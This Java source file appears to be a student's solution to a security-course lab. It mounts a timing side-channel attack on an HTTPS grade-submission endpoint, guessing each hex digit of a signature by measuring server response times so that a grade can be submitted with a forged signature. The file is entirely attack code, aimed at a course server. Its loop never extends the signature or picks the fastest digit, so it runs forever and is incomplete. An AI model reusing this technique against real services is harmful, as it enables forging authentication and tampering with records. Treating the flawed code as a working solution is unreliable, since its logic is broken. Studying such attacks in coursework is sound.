package SignatureCalc;

import javax.net.ssl.HttpsURLConnection;
import javax.xml.bind.DatatypeConverter;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.util.ArrayList;

/**
 * Created by oskar on 2016-12-13.
 */
public class Main {
    public static void main(String[] args) {
        String address = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=" + args[0] + "&grade=" + args[1] + "&signature=";
        URL url;


        try {

            HttpsURLConnection con;

            String signature = "";

            while (signature.length() < 20) {
                int[] times = new int[16];
                for (int i = 0; i < 16; i++) {

                    String testHex = Integer.toHexString(i);

                    url = new URL(address + signature + testHex);
                    con = (HttpsURLConnection) url.openConnection();
                    long currentTime = System.currentTimeMillis();

                    BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));

                    String result = "";
                    String line;


                    while ((line = br.readLine()) != null) {
                        result += line;
                    }
                    br.close();

                    times[i] = (int) (System.currentTimeMillis() - currentTime);


                    if (Integer.valueOf(result.trim()) != 0) {
                        System.out.println("Signature found!");
                    }
                }
                for (int i = 0; i < times.length; i++){
                    System.out.print(i + ": " + times[i] + "  ");
                }
                System.out.println("Current signature: " + signature);
            }


        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
